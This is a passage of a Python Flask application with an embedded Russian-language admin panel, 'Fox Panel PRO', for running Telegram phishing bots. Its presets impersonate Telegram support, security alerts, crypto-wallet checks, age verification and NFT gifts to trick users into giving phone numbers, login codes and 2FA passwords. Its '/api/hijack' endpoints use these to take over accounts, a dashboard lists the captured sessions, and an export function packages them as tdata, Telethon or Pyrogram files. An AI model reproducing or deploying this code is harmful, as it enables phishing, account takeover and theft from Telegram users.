        .color-option.active { border-color: white; box-shadow: 0 0 10px rgba(255,255,255,0.3); }
        
        input[type="checkbox"] { width: 18px; height: 18px; accent-color: var(--accent); cursor: pointer; }
    </style>
</head>
<body>
    <div class="toast-container" id="toasts"></div>

    <div class="container">
        <header>
            <h1>🦊 Fox Panel <span>PRO</span></h1>
            <div class="stats-bar">
                <div class="stat-card"><span class="stat-val" id="statBots">0</span><span class="stat-lbl">Ботов</span></div>
                <div class="stat-card"><span class="stat-val" id="statActive">0</span><span class="stat-lbl">Активных</span></div>
                <div class="stat-card"><span class="stat-val" id="statSessions">0</span><span class="stat-lbl">Сессий</span></div>
                <div class="stat-card"><span class="stat-val" id="statClicks">0</span><span class="stat-lbl">Кликов</span></div>
            </div>
        </header>

        <div class="funnel">
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <span style="font-weight:500;">Воронка конверсии</span>
                <span style="color:var(--muted); font-size:13px;" id="convRate">0% конверсия в код</span>
            </div>
            <div class="funnel-bars">
                <div class="funnel-seg" id="fStart" style="background:var(--accent); width: 100%;">0 Старт</div>
                <div class="funnel-seg" id="fWebapp" style="background:var(--orange); width: 0%;">0 WebApp</div>
                <div class="funnel-seg" id="fCode" style="background:var(--green); width: 0%;">0 Код</div>
            </div>
            <div class="funnel-legend">
                <span><span class="leg-dot" style="background:var(--accent)"></span> /start</span>
                <span><span class="leg-dot" style="background:var(--orange)"></span> Открыли форму</span>
                <span><span class="leg-dot" style="background:var(--green)"></span> Ввели код</span>
            </div>
        </div>

        <div class="main-grid">
            <div>
                <nav class="tabs">
                    <button class="tab-btn active" onclick="switchTab('bots', this)">🤖 Боты</button>
                    <button class="tab-btn" onclick="switchTab('constructor', this)">🎨 Конструктор</button>
                    <button class="tab-btn" onclick="switchTab('sessions', this)">🔑 Сессии</button>
                </nav>

                <div id="tab-bots" class="tab-content active">
                    <div class="top-actions">
                        <button class="btn-primary" onclick="openCreateModal()">+ Создать бота</button>
                    </div>
                    <div id="botsGrid" class="grid"></div>
                </div>

                <div id="tab-constructor" class="tab-content">
                    <div class="constructor-layout">
                        <div class="config-panel">
                            <h3 style="margin-top:0;">⚙️ Конструктор шаблона</h3>
                            <input type="hidden" id="editBotId">
                            
                            <div class="form-group">
                                <label>Пресет</label>
                                <div class="presets">
                                    <button class="preset-btn active" onclick="applyPreset('custom', this)">Свой</button>
                                    <button class="preset-btn" onclick="applyPreset('security', this)">🔒 Саппорт</button>
                                    <button class="preset-btn" onclick="applyPreset('crypto', this)">💰 Крипта</button>
                                    <button class="preset-btn" onclick="applyPreset('nsfw', this)">🔥 18+</button>
                                    <button class="preset-btn" onclick="applyPreset('gift', this)">🎁 Подарок</button>
                                </div>
                            </div>

                            <div class="form-group">
                                <label>Название бота</label>
                                <input type="text" id="cName" placeholder="Telegram Support">
                            </div>
                            
                            <div class="section-title">📨 Сообщение бота</div>
                            
                            <div class="form-group">
                                <label>Приветственный текст</label>
                                <textarea id="cWelcomeText" rows="3">🔐 Для безопасности вашего аккаунта необходимо подтвердить личность.</textarea>
                            </div>
                            
                            <div class="form-group">
                                <label>Картинка приветствия (URL)</label>
                                <input type="text" id="cWelcomeImg" placeholder="https://i.imgur.com/secure.jpg">
                            </div>
                            
                            <div class="form-group">
                                <label>Текст кнопки WebApp</label>
                                <input type="text" id="cBtnText" value="🟢 Зарегистрироваться">
                            </div>

                            <div class="form-group">
                                <label>Автоответ бота (на любое сообщение)</label>
                                <input type="text" id="cAutoReply" value="✅ Код принят. Верификация проходит в фоновом режиме.">
                            </div>

                            <div class="section-title">🌐 WebApp Форма</div>
                            
                            <div class="form-group">
                                <label>Иконка формы</label>
                                <div class="icon-grid" id="iconGrid"></div>
                                <input type="text" id="cWaIcon" value="✈️" placeholder="Эмодзи или символ" style="margin-top:8px;" oninput="updatePreview()">
                            </div>
                            
                            <div class="form-group">
                                <label>Заголовок формы</label>
                                <input type="text" id="cWaTitle" value="Подтверждение личности" oninput="updatePreview()">
                            </div>
                            
                            <div class="form-group">
                                <label>Описание формы</label>
                                <textarea id="cWaDesc" rows="3" oninput="updatePreview()">Для безопасности вашего аккаунта необходимо подтвердить номер телефона, привязанный к Telegram.</textarea>
                            </div>
                            
                            <div class="form-group">
                                <label>Цвет акцента</label>
                                <div class="color-grid" id="colorGrid"></div>
                                <input type="color" id="cWaColor" value="#2AABEE" style="margin-top:8px; width:100%; height:40px; padding:2px; cursor:pointer;" oninput="updatePreview()">
                            </div>
                            
                            <div class="form-group">
                                <label>Текст кнопки "Далее"</label>
                                <input type="text" id="cWaBtnText" value="Далее" oninput="updatePreview()">
                            </div>

                            <div class="section-title">👤 Профиль бота</div>

                            <div class="form-group">
                                <label>Аватарка бота (URL)</label>
                                <input type="text" id="cAvatarUrl" placeholder="https://i.imgur.com/avatar.png">
                            </div>

                            <div class="form-group">
                                <label>About (под именем)</label>
                                <input type="text" id="cAboutText" placeholder="Официальный бот поддержки">
                            </div>

                            <div class="form-group">
                                <label>Description (что умеет бот)</label>
                                <textarea id="cDescriptionText" rows="3" placeholder="Этот бот позволяет быстро авторизоваться..."></textarea>
                            </div>

                            <button class="btn-primary" style="width:100%" onclick="saveTemplate()">💾 Сохранить шаблон</button>
                        </div>
                        <div class="preview-panel">
                            <h3 style="margin-top:0;">👁 Превью</h3>
                            
                            <div style="font-size:12px; color:var(--muted); margin-bottom:10px; text-align:left;">Сообщение бота:</div>
                            <div class="telegram-msg">
                                <div class="tg-img" id="prevImg">Картинка</div>
                                <div class="tg-text" id="prevText">🔐 Для безопасности вашего аккаунта необходимо подтвердить личность.</div>
                                <div class="tg-btn" id="prevBtn" style="background:var(--accent)">🟢 Зарегистрироваться</div>
                            </div>
                            
                            <div style="font-size:12px; color:var(--muted); margin:20px 0 10px; text-align:left;">WebApp форма:</div>
                            <div class="wa-preview">
                                <div class="wa-logo-prev" id="waPrevLogo">✈️</div>
                                <div class="wa-title-prev" id="waPrevTitle">Подтверждение личности</div>
                                <div class="wa-desc-prev" id="waPrevDesc">Для безопасности вашего аккаунта необходимо подтвердить номер телефона.</div>
                                <div class="wa-input-prev">+7 900 123 4567</div>
                                <div class="wa-btn-prev" id="waPrevBtn">Далее</div>
                            </div>
                        </div>
                    </div>
                </div>

                <div id="tab-sessions" class="tab-content">
                    <div class="top-actions">
                        <h3 style="margin:0">🔑 Перехваченные сессии</h3>
                        <button class="btn-sm btn-danger" onclick="clearSessions()">🗑 Очистить всё</button>
                    </div>
                    
                    <div class="export-controls" style="margin-bottom: 15px;">
                        <input type="checkbox" id="selectAll" onchange="toggleSelectAll(this)">
                        <label for="selectAll" style="margin:0; color:var(--text); cursor:pointer;">Выделить все</label>
                        <div style="flex:1;"></div>
                        <select id="exportFormat">
                            <option value="tdata">📁 tdata (Telegram Desktop)</option>
                            <option value="telethon">🐍 .session Telethon</option>
                            <option value="pyrogram">🐍 .session Pyrogram</option>
                            <option value="json">📄 JSON</option>
                        </select>
                        <button class="btn-primary" style="padding: 8px 15px;" onclick="exportSelected()">📥 Скачать выделенные</button>
                    </div>

                    <table>
                        <thead>
                            <tr>
                                <th style="width: 40px;"></th>
                                <th>Бот</th><th>Телефон</th><th>Код</th><th>IP</th><th>Сессия</th><th>Время</th>
                            </tr>
                        </thead>
                        <tbody id="sessionsTable"></tbody>
                    </table>
                </div>
            </div>

            <div class="live-feed">
                <h3 style="margin-top:0; display:flex; align-items:center; gap:10px;">
                    🟢 Живая лента 
                    <span style="width:8px; height:8px; background:var(--green); border-radius:50%; animation: pulse 2s infinite;"></span>
                </h3>
                <style>@keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }</style>
                <div id="activityFeed" style="max-height: 600px; overflow-y: auto;"></div>
            </div>
        </div>

        <div id="createModal" class="modal hidden">
            <div class="modal-content">
                <h2 style="margin-top:0">🤖 Новый бот</h2>
                <div class="form-group"><label>Имя бота</label><input type="text" id="mName" placeholder="Telegram Support"></div>
                <div class="form-group"><label>API ID</label><input type="text" id="mApiId" placeholder="12345678"></div>
                <div class="form-group"><label>API Hash</label><input type="text" id="mApiHash" placeholder="abc123def456..."></div>
                <div class="form-group"><label>Bot Token</label><input type="text" id="mToken" placeholder="123456:ABC-DEF..."></div>
                <button class="btn-primary" style="width:100%" onclick="createBotFromModal()">Создать</button>
                <button class="btn-secondary" style="width:100%; margin-top:10px;" onclick="closeCreateModal()">Отмена</button>
            </div>
        </div>
    </div>

    <script>
        const API = '/api';
        const PRESETS = {
            custom: { text: '🔐 Для безопасности вашего аккаунта необходимо подтвердить личность.', btn: '🟢 Зарегистрироваться', reply: '✅ Код принят. Верификация проходит в фоновом режиме.', icon: '✈️', title: 'Подтверждение личности', desc: 'Для безопасности вашего аккаунта необходимо подтвердить номер телефона, привязанный к Telegram.', color: '#2AABEE', waBtn: 'Далее' },
            security: { text: '🚨 Внимание! Обнаружен подозрительный вход в ваш аккаунт.\\n\\nДля подтверждения личности и блокировки чужой сессии, пройдите верификацию ниже.', btn: '🛡 Защитить аккаунт', reply: '🛡 Ваш аккаунт успешно защищен. Чужие сессии завершены.', icon: '🛡', title: 'Защита аккаунта', desc: 'Мы зафиксировали попытку входа с нового устройства. Подтвердите, что это вы, чтобы заблокировать злоумышленника.', color: '#E05D5D', waBtn: '🛡 Защитить' },
            crypto: { text: '💰 Ваш крипто-кошелек требует обновления безопасности.\\n\\nДля сохранения средств подтвердите владение кошельком через Telegram Gateway.', btn: '🔑 Подключить кошелек', reply: '💰 Кошелек успешно привязан. Токены в безопасности.', icon: '💰', title: 'Верификация кошелька', desc: 'Для привязки кошелька и доступа к балансу необходимо подтвердить ваш номер телефона через Telegram.', color: '#F5A623', waBtn: '🔗 Подключить' },
            nsfw: { text: '🔥 Для доступа к закрытому каналу 18+ необходимо подтвердить ваш возраст через Telegram Verify.', btn: '🔞 Подтвердить возраст', reply: '✅ Возраст подтвержден. Доступ к каналу открыт.', icon: '🔥', title: 'Проверка возраста', desc: 'Для доступа к контенту 18+ мы должны убедиться, что вам исполнилось 18 лет. Подтвердите номер телефона.', color: '#E05D5D', waBtn: '🔞 Подтвердить' },
            gift: { text: '🎁 Вы получили подарочный NFT!\\n\\nДля получения подарка на ваш кошелек, подтвердите аккаунт через Telegram.', btn: '🎁 Получить подарок', reply: '🎁 Подарок отправлен на ваш кошелек!', icon: '🎁', title: 'Получение подарка', desc: 'Для безопасной передачи подарка необходимо подтвердить владение Telegram аккаунтом.', color: '#4DD665', waBtn: '🎁 Получить' }
        };

        const ICONS = ['✈️','🛡','💰','🔥','🎁','🔐','⚡','📱','✅','🤖','🦊','🔑'];
        const COLORS = ['#2AABEE','#E05D5D','#F5A623','#4DD665','#7C5CFC','#FF6B9D','#1DB954','#FF4500'];

        function initUI() {
            const iconGrid = document.getElementById('iconGrid');
            ICONS.forEach(icon => {
                const div = document.createElement('div');
                div.className = 'icon-option' + (icon === '✈️' ? ' active' : '');
                div.textContent = icon;
                div.onclick = () => {
                    document.querySelectorAll('.icon-option').forEach(d => d.classList.remove('active'));
                    div.classList.add('active');
                    document.getElementById('cWaIcon').value = icon;
                    updatePreview();
                };
                iconGrid.appendChild(div);
            });

            const colorGrid = document.getElementById('colorGrid');
            COLORS.forEach(color => {
                const div = document.createElement('div');
                div.className = 'color-option' + (color === '#2AABEE' ? ' active' : '');
                div.style.background = color;
                div.onclick = () => {
                    document.querySelectorAll('.color-option').forEach(d => d.classList.remove('active'));
                    div.classList.add('active');
                    document.getElementById('cWaColor').value = color;
                    updatePreview();
                };
                colorGrid.appendChild(div);
            });
        }

        function switchTab(tabId, btn) {
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.getElementById('tab-' + tabId).classList.add('active');
            btn.classList.add('active');
        }

        function applyPreset(preset, btn) {
            document.querySelectorAll('.preset-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            const p = PRESETS[preset];
            document.getElementById('cWelcomeText').value = p.text;
            document.getElementById('cBtnText').value = p.btn;
            document.getElementById('cAutoReply').value = p.reply;
            document.getElementById('cWaIcon').value = p.icon;
            document.getElementById('cWaTitle').value = p.title;
            document.getElementById('cWaDesc').value = p.desc;
            document.getElementById('cWaColor').value = p.color;
            document.getElementById('cWaBtnText').value = p.waBtn;
            document.querySelectorAll('.icon-option').forEach(d => {
                d.classList.toggle('active', d.textContent === p.icon);
            });
            document.querySelectorAll('.color-option').forEach(d => {
                d.classList.toggle('active', d.style.background === p.color);
            });
            updatePreview();
        }

        function updatePreview() {
            const text = document.getElementById('cWelcomeText').value;
            const btn = document.getElementById('cBtnText').value;
            const img = document.getElementById('cWelcomeImg').value;
            const icon = document.getElementById('cWaIcon').value;
            const title = document.getElementById('cWaTitle').value;
            const desc = document.getElementById('cWaDesc').value;
            const color = document.getElementById('cWaColor').value;
            const waBtn = document.getElementById('cWaBtnText').value;

            document.getElementById('prevText').textContent = text;
            document.getElementById('prevBtn').textContent = btn;
            document.getElementById('prevBtn').style.background = color;
            document.getElementById('prevImg').style.backgroundImage = img ? `url(${img})` : 'none';
            document.getElementById('prevImg').textContent = img ? '' : 'Картинка';

            document.getElementById('waPrevLogo').textContent = icon;
            document.getElementById('waPrevLogo').style.background = color;
            document.getElementById('waPrevTitle').textContent = title;
            document.getElementById('waPrevDesc').textContent = desc;
            document.getElementById('waPrevBtn').textContent = waBtn;
            document.getElementById('waPrevBtn').style.background = color;
        }

        function toast(msg, isError = false) {
            const container = document.getElementById('toasts');
            const div = document.createElement('div');
            div.className = 'toast' + (isError ? ' error' : '');
            div.textContent = msg;
            container.appendChild(div);
            setTimeout(() => div.remove(), 3000);
        }

        function openCreateModal() { document.getElementById('createModal').classList.remove('hidden'); }
        function closeCreateModal() { document.getElementById('createModal').classList.add('hidden'); }

        async function createBotFromModal() {
            const name = document.getElementById('mName').value;
            const api_id = document.getElementById('mApiId').value;
            const api_hash = document.getElementById('mApiHash').value;
            const bot_token = document.getElementById('mToken').value;
            if (!name || !api_id || !api_hash || !bot_token) { toast('Заполните все поля', true); return; }
            
            try {
                const res = await fetch(`${API}/bots`, {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ name, api_id, api_hash, bot_token })
                });
                if (res.ok) { toast('Бот создан'); closeCreateModal(); loadBots(); loadStats(); }
                else { toast('Ошибка создания', true); }
            } catch(e) { toast('Ошибка сети', true); }
        }

        async function loadBots() {
            try {
                const res = await fetch(`${API}/bots`);
                const bots = await res.json();
                const grid = document.getElementById('botsGrid');
                grid.innerHTML = '';
                bots.forEach(bot => {
                    const isRunning = bot.status === 'running';
                    const card = document.createElement('div');
                    card.className = 'bot-card';
                    card.innerHTML = `
                        <div class="card-header">
                            <h3>${bot.name}</h3>
                            <span class="badge ${isRunning ? 'bg-green' : 'bg-gray'}">${isRunning ? '🟢 RUN' : '⏹ STOP'}</span>
                        </div>
                        <p class="token-preview">${bot.bot_token}</p>
                        <div class="card-actions">
                            <button class="btn-sm" onclick="editBot(${bot.id})">🎨</button>
                            ${isRunning 
                                ? `<button class="btn-sm btn-stop" onclick="stopBot(${bot.id})">⏹ Стоп</button>`
                                : `<button class="btn-sm" onclick="startBot(${bot.id})">▶ Старт</button>`
                            }
                            <button class="btn-sm btn-danger" onclick="deleteBot(${bot.id})">🗑</button>
                        </div>`;
                    grid.appendChild(card);
                });
            } catch(e) {}
        }

        async function startBot(id) {
            try {
                const res = await fetch(`${API}/bots/${id}/start`, { method: 'POST' });
                if (res.ok) { toast('Бот запускается...'); loadBots(); loadStats(); }
                else { const data = await res.json(); toast(data.error || 'Ошибка запуска', true); }
            } catch(e) { toast('Ошибка сети', true); }
        }

        async function stopBot(id) {
            try {
                const res = await fetch(`${API}/bots/${id}/stop`, { method: 'POST' });
                if (res.ok) { toast('Бот останавливается...'); loadBots(); loadStats(); }
            } catch(e) { toast('Ошибка сети', true); }
        }

        async function deleteBot(id) {
            if (!confirm('Удалить бота?')) return;
            try {
                await fetch(`${API}/bots/${id}`, { method: 'DELETE' });
                toast('Бот удален'); loadBots(); loadStats();
            } catch(e) { toast('Ошибка', true); }
        }

        async function editBot(id) {
            try {
                const res = await fetch(`${API}/bots`);
                const bots = await res.json();
                const bot = bots.find(b => b.id === id);
                if (!bot) return;
                
                document.getElementById('editBotId').value = id;
                document.getElementById('cName').value = bot.name || '';
                document.getElementById('cWelcomeText').value = bot.welcome_text || '';
                document.getElementById('cWelcomeImg').value = bot.welcome_img || '';
                document.getElementById('cBtnText').value = bot.btn_text || '';
                document.getElementById('cAutoReply').value = bot.auto_reply || '';
                document.getElementById('cWaIcon').value = bot.wa_icon || '';
                document.getElementById('cWaTitle').value = bot.wa_title || '';
                document.getElementById('cWaDesc').value = bot.wa_desc || '';
                document.getElementById('cWaColor').value = bot.wa_color || '#2AABEE';
                document.getElementById('cWaBtnText').value = bot.wa_btn_text || '';
                document.getElementById('cAvatarUrl').value = bot.avatar_url || '';
                document.getElementById('cAboutText').value = bot.about_text || '';
                document.getElementById('cDescriptionText').value = bot.description_text || '';
                
                switchTab('constructor', document.querySelectorAll('.tab-btn')[1]);
                updatePreview();
            } catch(e) {}
        }

        async function saveTemplate() {
            const id = document.getElementById('editBotId').value;
            const data = {
                name: document.getElementById('cName').value,
                welcome_text: document.getElementById('cWelcomeText').value,
                welcome_img: document.getElementById('cWelcomeImg').value,
                btn_text: document.getElementById('cBtnText').value,
                auto_reply: document.getElementById('cAutoReply').value,
                wa_icon: document.getElementById('cWaIcon').value,
                wa_title: document.getElementById('cWaTitle').value,
                wa_desc: document.getElementById('cWaDesc').value,
                wa_color: document.getElementById('cWaColor').value,
                wa_btn_text: document.getElementById('cWaBtnText').value,
                avatar_url: document.getElementById('cAvatarUrl').value,
                about_text: document.getElementById('cAboutText').value,
                description_text: document.getElementById('cDescriptionText').value,
            };
            
            try {
                if (id) {
                    await fetch(`${API}/bots/${id}`, { method: 'PUT', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data) });
                    toast('Шаблон обновлен');
                } else {
                    toast('Выберите бота для редактирования (нажмите 🎨 на карточке)', true);
                }
            } catch(e) { toast('Ошибка сохранения', true); }
        }

        async function loadSessions() {
            try {
                const res = await fetch(`${API}/sessions`);
                const sessions = await res.json();
                const tbody = document.getElementById('sessionsTable');
                tbody.innerHTML = '';
                sessions.forEach(s => {
                    const tr = document.createElement('tr');
                    const shortSession = s.session_string ? s.session_string.substring(0, 20) + '...' : '';
                    tr.innerHTML = `
                        <td><input type="checkbox" class="session-check" data-id="${s.id}"></td>
                        <td>${s.bot_id}</td>
                        <td>${s.phone}</td>
                        <td>${s.code || '-'}</td>
                        <td>${s.ip || '-'}</td>
                        <td><span class="session-str" onclick="navigator.clipboard.writeText('${s.session_string}')">${shortSession}</span></td>
                        <td>${s.captured_at || '-'}</td>`;
                    tbody.appendChild(tr);
                });
            } catch(e) {}
        }

        async function loadStats() {
            try {
                const res = await fetch(`${API}/stats`);
                const stats = await res.json();
                document.getElementById('statBots').textContent = stats.bots || 0;
                document.getElementById('statActive').textContent = stats.active || 0;
                document.getElementById('statSessions').textContent = stats.sessions || 0;
                document.getElementById('statClicks').textContent = stats.clicks || 0;

                const starts = stats.funnel?.starts || 0;
                const webapps = stats.funnel?.webapp || 0;
                const codes = stats.funnel?.codes || 0;
                const maxVal = Math.max(starts, 1);
                
                document.getElementById('fStart').style.width = '100%';
                document.getElementById('fStart').textContent = `${starts} Старт`;
                document.getElementById('fWebapp').style.width = `${(webapps/maxVal)*100}%`;
                document.getElementById('fWebapp').textContent = `${webapps} WebApp`;
                document.getElementById('fCode').style.width = `${(codes/maxVal)*100}%`;
                document.getElementById('fCode').textContent = `${codes} Код`;
                
                const convRate = starts > 0 ? ((codes/starts)*100).toFixed(1) : 0;
                document.getElementById('convRate').textContent = `${convRate}% конверсия в код`;
            } catch(e) {}
        }

        async function loadLogs() {
            try {
                const res = await fetch(`${API}/logs`);
                const logs = await res.json();
                const feed = document.getElementById('activityFeed');
                feed.innerHTML = '';
                logs.slice(-20).reverse().forEach(log => {
                    const icons = { 'bot_start': '🤖', 'bot_auto_reply': '💬', 'code_submitted': '🔑', '2fa_submitted': '🔐', 'webapp_opened': '🌐' };
                    const div = document.createElement('div');
                    div.className = 'feed-item';
                    div.innerHTML = `
                        <div class="feed-icon" style="background:var(--surface2)">${icons[log.action] || '📌'}</div>
                        <span>${log.action} ${log.tg_username ? '@'+log.tg_username : ''}</span>
                        <span class="feed-time">${log.timestamp || ''}</span>`;
                    feed.appendChild(div);
                });
            } catch(e) {}
        }

        function toggleSelectAll(checkbox) {
            document.querySelectorAll('.session-check').forEach(cb => cb.checked = checkbox.checked);
        }

        async function exportSelected() {
            const format = document.getElementById('exportFormat').value;
            const checked = document.querySelectorAll('.session-check:checked');
            if (checked.length === 0) { toast('Выберите сессии', true); return; }
            const ids = Array.from(checked).map(cb => cb.dataset.id);
            window.location.href = `${API}/export?format=${format}&ids=${ids.join(',')}`;
        }

        async function clearSessions() {
            if (!confirm('Удалить все сессии?')) return;
            try {
                await fetch(`${API}/sessions`, { method: 'DELETE' });
                toast('Сессии очищены'); loadSessions(); loadStats();
            } catch(e) {}
        }

        initUI();
        loadBots(); loadStats(); loadSessions(); loadLogs();
        setInterval(() => { loadStats(); loadLogs(); loadSessions(); }, 5000);
    </script>
</body>
</html>'''

# ==========================================
# FLASK API СЕРВЕР
# ==========================================
app = Flask(__name__)

@app.route('/')
def index():
    return PANEL_HTML

@app.route('/webapp/')
def webapp():
    bot_id = request.args.get('bot_id', type=int)
    if not bot_id:
        return "Bot ID not specified", 400
    
    conn = get_db()
    bot = conn.execute("SELECT * FROM bots WHERE id = ?", (bot_id,)).fetchone()
    conn.close()
    
    if not bot:
        return "Bot not found", 404
    
    config = dict(bot)
    log_click(bot_id, "webapp_opened")
    return get_webapp_html(config)

# --- API: Bots ---
@app.route('/api/bots', methods=['GET'])
def api_get_bots():
    conn = get_db()
    bots = conn.execute("SELECT * FROM bots").fetchall()
    conn.close()
    return jsonify([dict(b) for b in bots])

@app.route('/api/bots', methods=['POST'])
def api_create_bot():
    data = request.json
    conn = get_db()
    cursor = conn.execute(
        "INSERT INTO bots (name, api_id, api_hash, bot_token) VALUES (?, ?, ?, ?)",
        (data['name'], data['api_id'], data['api_hash'], data['bot_token'])
    )
    conn.commit()
    bot_id = cursor.lastrowid
    conn.close()
    return jsonify({"id": bot_id, "status": "created"}), 201

@app.route('/api/bots/<int:bot_id>', methods=['PUT'])
def api_update_bot(bot_id):
    data = request.json
    conn = get_db()
    fields = ", ".join([f"{k} = ?" for k in data.keys()])
    values = list(data.values()) + [bot_id]
    conn.execute(f"UPDATE bots SET {fields} WHERE id = ?", values)
    conn.commit()
    conn.close()
    return jsonify({"status": "updated"})

@app.route('/api/bots/<int:bot_id>', methods=['DELETE'])
def api_delete_bot(bot_id):
    stop_bot_sync(bot_id)
    conn = get_db()
    conn.execute("DELETE FROM bots WHERE id = ?", (bot_id,))
    conn.commit()
    conn.close()
    return jsonify({"status": "deleted"})

@app.route('/api/bots/<int:bot_id>/start', methods=['POST'])
def api_start_bot(bot_id):
    conn = get_db()
    bot = conn.execute("SELECT * FROM bots WHERE id = ?", (bot_id,)).fetchone()
    conn.close()
    
    if not bot:
        return jsonify({"error": "Bot not found"}), 404
    
    config = dict(bot)
    
    if bot_id in bot_threads and bot_threads[bot_id].is_alive():
        return jsonify({"error": "Bot already running"}), 400
    
    t = threading.Thread(
        target=start_bot_sync,
        args=(bot_id, bot['bot_token'], int(bot['api_id']), bot['api_hash'], config),
        daemon=True
    )
    bot_threads[bot_id] = t
    t.start()
    
    conn = get_db()
    conn.execute("UPDATE bots SET status = 'running' WHERE id = ?", (bot_id,))
    conn.commit()
    conn.close()
    
    return jsonify({"status": "starting"})

@app.route('/api/bots/<int:bot_id>/stop', methods=['POST'])
def api_stop_bot(bot_id):
    stop_bot_sync(bot_id)
    
    conn = get_db()
    conn.execute("UPDATE bots SET status = 'stopped' WHERE id = ?", (bot_id,))
    conn.commit()
    conn.close()
    
    return jsonify({"status": "stopped"})

# --- API: Sessions & Hijack ---
@app.route('/api/sessions', methods=['GET'])
def api_get_sessions():
    conn = get_db()
    sessions = conn.execute("SELECT * FROM sessions ORDER BY id DESC").fetchall()
    conn.close()
    return jsonify([dict(s) for s in sessions])

@app.route('/api/sessions', methods=['DELETE'])
def api_clear_sessions():
    conn = get_db()
    conn.execute("DELETE FROM sessions")
    conn.commit()
    conn.close()
    return jsonify({"status": "cleared"})

@app.route('/api/init_session', methods=['POST'])
def api_init_session():
    data = request.json
    phone = data.get('phone', '')
    bot_id = data.get('bot_id', 0)
    
    conn = get_db()
    bot = conn.execute("SELECT * FROM bots WHERE id = ?", (bot_id,)).fetchone()
    conn.close()
    
    if not bot:
        return jsonify({"success": False, "error": "Bot not found"}), 404
    
    log_click(bot_id, "webapp_opened")
    
    try:
        result = run_pyro_async(send_code_async(int(bot['api_id']), bot['api_hash'], phone))
        if result:
            return jsonify({"success": True})
        else:
            return jsonify({"success": False, "error": "Не удалось отправить код"}), 400
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/hijack', methods=['POST'])
def api_hijack():
    data = request.json
    phone = data.get('phone', '')
    code = data.get('code', '')
    bot_id = data.get('bot_id', 0)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    useragent = request.headers.get('User-Agent', '')
    
    conn = get_db()
    bot = conn.execute("SELECT * FROM bots WHERE id = ?", (bot_id,)).fetchone()
    conn.close()
    
    if not bot:
        return jsonify({"success": False, "error": "Bot not found"}), 404
    
    try:
        result = run_pyro_async(hijack_session_async(
            int(bot['api_id']), bot['api_hash'], phone, code, bot_id, ip, useragent
        ))
        return jsonify(result)
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/hijack_2fa', methods=['POST'])
def api_hijack_2fa():
    data = request.json
    phone = data.get('phone', '')
    password = data.get('password', '')
    bot_id = data.get('bot_id', 0)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    useragent = request.headers.get('User-Agent', '')
    
    try:
        result = run_pyro_async(hijack_2fa_async(phone, password, bot_id, ip, useragent))
        return jsonify(result)
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

# --- API: Stats & Logs ---
@app.route('/api/stats', methods=['GET'])
def api_stats():
    conn = get_db()
    bots_count = conn.execute("SELECT COUNT(*) FROM bots").fetchone()[0]
    sessions_count = conn.execute("SELECT COUNT(*) FROM sessions").fetchone()[0]
    clicks_count = conn.execute("SELECT COUNT(*) FROM clicks").fetchone()[0]
    
    starts = conn.execute("SELECT COUNT(*) FROM clicks WHERE action = 'bot_start'").fetchone()[0]
    webapps = conn.execute("SELECT COUNT(*) FROM clicks WHERE action = 'webapp_opened'").fetchone()[0]
    codes = conn.execute("SELECT COUNT(*) FROM clicks WHERE action IN ('code_submitted', '2fa_submitted')").fetchone()[0]
    conn.close()
    
    return jsonify({
        "bots": bots_count,
        "active": len(active_bots),
        "sessions": sessions_count,
        "clicks": clicks_count,
        "funnel": {"starts": starts, "webapp": webapps, "codes": codes}
    })

@app.route('/api/logs', methods=['GET'])
def api_logs():
    conn = get_db()
    logs = conn.execute("SELECT * FROM clicks ORDER BY id DESC LIMIT 50").fetchall()
    conn.close()
    return jsonify([dict(l) for l in logs])

# --- API: Export ---
@app.route('/api/export', methods=['GET'])
def api_export():
    fmt = request.args.get('format', 'json')
    ids = request.args.get('ids', '').split(',')
    
    if not ids or ids[0] == '':
        return jsonify({"error": "No IDs provided"}), 400
    
    conn = get_db()
    placeholders = ','.join(['?'] * len(ids))
    sessions = conn.execute(f"SELECT * FROM sessions WHERE id IN ({placeholders})", ids).fetchall()
    conn.close()
    
    if fmt == 'json':
        data = []
        for s in sessions:
            data.append(generate_json_session(
                s['session_string'], int(s['bot_id']), '', s['phone'], s['code']
            ))
        return jsonify(data)
    
    mem_zip = io.BytesIO()
    with zipfile.ZipFile(mem_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
        for s in sessions:
            safe_phone = normalize_phone(s['phone'])
            if fmt == 'tdata':
                tdata_bytes = generate_tdata(s['session_string'], int(s['bot_id']), '', s['phone'])
                zf.writestr(f"tdata_{safe_phone}/data", tdata_bytes)
            elif fmt == 'telethon':
                telethon_bytes = generate_telethon_session(s['session_string'], int(s['bot_id']), '', s['phone'])
                zf.writestr(f"telethon_{safe_phone}.session", telethon_bytes)
            elif fmt == 'pyrogram':
                zf.writestr(f"pyrogram_{safe_phone}.session", s['session_string'])
    
    mem_zip.seek(0)
    return send_file(mem_zip, mimetype='application/zip', as_attachment=True, download_name=f'sessions_{fmt}.zip')

if __name__ == '__main__':
    print("[*] Fox Panel запущен на http://127.0.0.1:5000")
    app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)
